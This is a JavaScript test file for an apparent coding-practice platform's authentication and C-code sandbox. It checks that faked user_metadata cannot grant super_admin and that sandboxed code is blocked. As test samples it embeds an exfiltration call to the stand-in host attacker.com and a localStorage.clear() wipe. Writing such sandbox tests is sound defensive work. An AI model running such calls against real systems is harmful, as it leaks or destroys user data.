import test from 'node:test';
import assert from 'node:assert/strict';
import * as authService from '../src/services/authService.ts';
import { mapSupabaseUserToAuthUser } from '../src/services/supabaseAuth.ts';

test('1. Guest user is safe and strictly has student role', () => {
  assert.equal(authService.GUEST_USER.id, 'usr_guest');
  assert.equal(authService.GUEST_USER.role, 'student');
  assert.equal(authService.GUEST_USER.email, 'guest@ahtest.code');
  assert.equal(authService.isGuestUser(authService.GUEST_USER), true);
  assert.equal(authService.isGuestUser(null), true);
  assert.equal(authService.isGuestUser(undefined), true);
});

test('2. Hardcoded admin credentials and hash functions are completely purged', () => {
  // Ensure no sensitive constants or plaintext passwords leak into client bundles
  assert.equal(authService.ADMIN_EMAIL, undefined);
  assert.equal(authService.ADMIN_PASSWORD_HASH, undefined);
  assert.equal(authService.verifyAdminCredentials, undefined);
  assert.equal(authService.hashPassword, undefined);
  assert.equal(authService.parseGoogleJwt, undefined);
});

test('3. Client-side user_metadata CANNOT escalate privileges to super_admin', () => {
  // Malicious attacker attempts to supply fake user_metadata in token payload
  const maliciousUser = {
    id: 'attacker_123',
    email: 'hacker@malicious.com',
    user_metadata: {
      role: 'super_admin',
      is_admin: true
    }
  };

  // Without a verified database profile, mapSupabaseUserToAuthUser MUST ignore user_metadata and default to student
  const mappedUser = mapSupabaseUserToAuthUser(maliciousUser, null);
  assert.equal(mappedUser.role, 'student');
  assert.notEqual(mappedUser.role, 'super_admin');
});

test('4. Role is granted strictly through server-verified database profile', () => {
  const authenticUser = {
    id: 'user_456',
    email: 'admin.truong@ahtest.code',
    user_metadata: {
      full_name: 'Trương Quốc Anh'
    }
  };

  const verifiedAdminProfile = {
    id: 'user_456',
    email: 'admin.truong@ahtest.code',
    name: 'Trương Quốc Anh',
    avatar_url: null,
    role: 'super_admin',
    rating: 3000,
    streak_days: 45,
    rank_class: 'Super Admin'
  };

  const mappedAdmin = mapSupabaseUserToAuthUser(authenticUser, verifiedAdminProfile);
  assert.equal(mappedAdmin.role, 'super_admin');
  assert.equal(mappedAdmin.name, 'Trương Quốc Anh');
  assert.equal(mappedAdmin.rankClass, 'Super Admin');
});

test('5. Sandbox Security: Malicious code attempting to use fetch or localStorage is trapped', async () => {
  const { executeCCode } = await import('../src/services/cExecutionEngine.ts');
  
  const maliciousCode = `
    #include <stdio.h>
    int main() {
      fetch("https://attacker.com/steal?data=123");
      return 0;
    }
  `;

  const result = executeCCode(maliciousCode, '');
  assert.equal(result.status, 'CE');
  assert.ok(result.stderr.includes('security violation'));
});

test('6. Sandbox Security: DOM/host storage access attempts are trapped as security violation', async () => {
  const { executeCCode } = await import('../src/services/cExecutionEngine.ts');
  
  const maliciousCode = `
    #include <stdio.h>
    int main() {
      localStorage.clear();
      return 0;
    }
  `;

  const result = executeCCode(maliciousCode, '');
  assert.equal(result.status, 'CE');
  assert.ok(result.stderr.includes('security violation'));
});
